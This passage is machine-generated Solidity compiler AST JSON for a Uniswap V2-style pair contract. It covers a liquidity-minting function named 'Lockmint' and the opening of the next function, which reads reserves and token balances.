																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7082:144:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1616,
															"nodeType": "ExpressionStatement",
															"src": "7082:144:6"
														}
													]
												},
												"id": 1618,
												"nodeType": "IfStatement",
												"src": "6838:399:6",
												"trueBody": {
													"id": 1598,
													"nodeType": "Block",
													"src": "6861:201:6",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1589,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1578,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1519,
																	"src": "6875:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1587,
																			"name": "MINIMUM_LIQUIDITY",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 955,
																			"src": "6923:17:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"id": 1583,
																							"name": "amount1",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1558,
																							"src": "6909:7:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						],
																						"expression": {
																							"argumentTypes": null,
																							"id": 1581,
																							"name": "amount0",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1551,
																							"src": "6897:7:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 1582,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"memberName": "mul",
																						"nodeType": "MemberAccess",
																						"referencedDeclaration": 2267,
																						"src": "6897:11:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																							"typeString": "function (uint256,uint256) pure returns (uint256)"
																						}
																					},
																					"id": 1584,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"kind": "functionCall",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "6897:20:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 1579,
																					"name": "Math",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 928,
																					"src": "6887:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_contract$_Math_$928_$",
																						"typeString": "type(library Math)"
																					}
																				},
																				"id": 1580,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "sqrt",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 927,
																				"src": "6887:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_uint256_$",
																					"typeString": "function (uint256) pure returns (uint256)"
																				}
																			},
																			"id": 1585,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "6887:31:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 1586,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 2239,
																		"src": "6887:35:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 1588,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "6887:54:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "6875:66:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1590,
															"nodeType": "ExpressionStatement",
															"src": "6875:66:6"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 1593,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "6974:1:6",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				}
																			],
																			"id": 1592,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "6966:7:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 1594,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "6966:10:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1595,
																		"name": "MINIMUM_LIQUIDITY",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 955,
																		"src": "6978:17:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1591,
																	"name": "freezeMint",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 172,
																	"src": "6955:10:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
																		"typeString": "function (address,uint256) returns (bool)"
																	}
																},
																"id": 1596,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "6955:41:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"id": 1597,
															"nodeType": "ExpressionStatement",
															"src": "6955:41:6"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1622,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1620,
																"name": "liquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1519,
																"src": "7254:9:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1621,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "7266:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "7254:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e544544",
															"id": 1623,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "7269:42:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e",
																"typeString": "literal_string \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\""
															},
															"value": "UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e",
																"typeString": "literal_string \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\""
															}
														],
														"id": 1619,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2328,
															2329
														],
														"referencedDeclaration": 2329,
														"src": "7246:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1624,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7246:66:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1625,
												"nodeType": "ExpressionStatement",
												"src": "7246:66:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1627,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1514,
															"src": "7333:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1628,
															"name": "liquidity",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1519,
															"src": "7337:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1626,
														"name": "freezeMint",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 172,
														"src": "7322:10:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,uint256) returns (bool)"
														}
													},
													"id": 1629,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7322:25:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1630,
												"nodeType": "ExpressionStatement",
												"src": "7322:25:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1632,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1529,
															"src": "7366:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1633,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1540,
															"src": "7376:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1634,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1522,
															"src": "7386:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1635,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1524,
															"src": "7397:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1631,
														"name": "_update",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1255,
														"src": "7358:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint256_$_t_uint256_$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint256,uint256,uint112,uint112)"
														}
													},
													"id": 1636,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7358:49:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1637,
												"nodeType": "ExpressionStatement",
												"src": "7358:49:6"
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1638,
													"name": "feeOn",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1565,
													"src": "7421:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1648,
												"nodeType": "IfStatement",
												"src": "7417:47:6",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 1646,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1639,
															"name": "kLast",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 984,
															"src": "7428:5:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1644,
																	"name": "reserve1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 976,
																	"src": "7455:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1641,
																			"name": "reserve0",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 974,
																			"src": "7441:8:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		],
																		"id": 1640,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "7436:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": "uint"
																	},
																	"id": 1642,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "7436:14:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1643,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "mul",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2267,
																"src": "7436:18:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1645,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7436:28:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "7428:36:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1647,
													"nodeType": "ExpressionStatement",
													"src": "7428:36:6"
												}
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 1650,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2325,
																"src": "7524:3:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 1651,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "7524:10:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 1652,
															"name": "amount0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1551,
															"src": "7536:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1653,
															"name": "amount1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1558,
															"src": "7545:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1649,
														"name": "Mint",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1078
														],
														"referencedDeclaration": 1078,
														"src": "7519:4:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_uint256_$_t_uint256_$returns$__$",
															"typeString": "function (address,uint256,uint256)"
														}
													},
													"id": 1654,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7519:34:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1655,
												"nodeType": "EmitStatement",
												"src": "7514:39:6"
											}
										]
									},
									"documentation": null,
									"id": 1657,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 1517,
											"modifierName": {
												"argumentTypes": null,
												"id": 1516,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 1006,
												"src": "6318:4:6",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "6318:4:6"
										}
									],
									"name": "Lockmint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1515,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1514,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1657,
												"src": "6297:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1513,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "6297:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6296:12:6"
									},
									"returnParameters": {
										"id": 1520,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1519,
												"name": "liquidity",
												"nodeType": "VariableDeclaration",
												"scope": 1657,
												"src": "6332:14:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1518,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "6332:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6331:16:6"
									},
									"scope": 2193,
									"src": "6279:1281:6",
									"stateMutability": "nonpayable",
									"superFunction": 814,
									"visibility": "external"
								},
								{
									"body": {
										"id": 1820,
										"nodeType": "Block",
										"src": "7760:1338:6",
										"statements": [
											{
												"assignments": [
													1669,
													1671,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 1669,
														"name": "_reserve0",
														"nodeType": "VariableDeclaration",
														"scope": 1820,
														"src": "7771:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1668,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "7771:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 1671,
														"name": "_reserve1",
														"nodeType": "VariableDeclaration",
														"scope": 1820,
														"src": "7790:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1670,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "7790:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 1674,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1672,
														"name": "getReserves",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1028,
														"src": "7813:11:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
															"typeString": "function () view returns (uint112,uint112,uint32)"
														}
													},
													"id": 1673,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7813:13:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
														"typeString": "tuple(uint112,uint112,uint32)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7770:56:6"
											},
											{
												"assignments": [
													1676
												],
												"declarations": [
													{
														"constant": false,
														"id": 1676,
														"name": "_token0",
														"nodeType": "VariableDeclaration",
														"scope": 1820,
														"src": "7851:15:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 1675,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "7851:7:6",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1678,
												"initialValue": {
													"argumentTypes": null,
													"id": 1677,
													"name": "token0",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 968,
													"src": "7869:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7851:24:6"
											},
											{
												"assignments": [
													1680
												],
												"declarations": [
													{
														"constant": false,
														"id": 1680,
														"name": "_token1",
														"nodeType": "VariableDeclaration",
														"scope": 1820,
														"src": "7900:15:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 1679,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "7900:7:6",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1682,
												"initialValue": {
													"argumentTypes": null,
													"id": 1681,
													"name": "token1",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 970,
													"src": "7918:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7900:24:6"
											},
											{
												"assignments": [
													1684
												],
												"declarations": [
													{
														"constant": false,
														"id": 1684,
														"name": "balance0",
														"nodeType": "VariableDeclaration",
														"scope": 1820,
														"src": "7949:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1683,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7949:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1693,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1690,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2355,
																	"src": "7999:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Pair_$2193",
																		"typeString": "contract Pair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Pair_$2193",
																		"typeString": "contract Pair"
																	}
																],
																"id": 1689,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "7991:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1691,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7991:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1686,
																	"name": "_token0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1676,
																	"src": "7972:7:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1685,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 533,
																"src": "7965:6:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1687,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7965:15:6",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$533",
																"typeString": "contract IERC20"
															}
														},
														"id": 1688,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 494,
														"src": "7965:25:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1692,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7965:40:6",
													"typeDescriptions": {
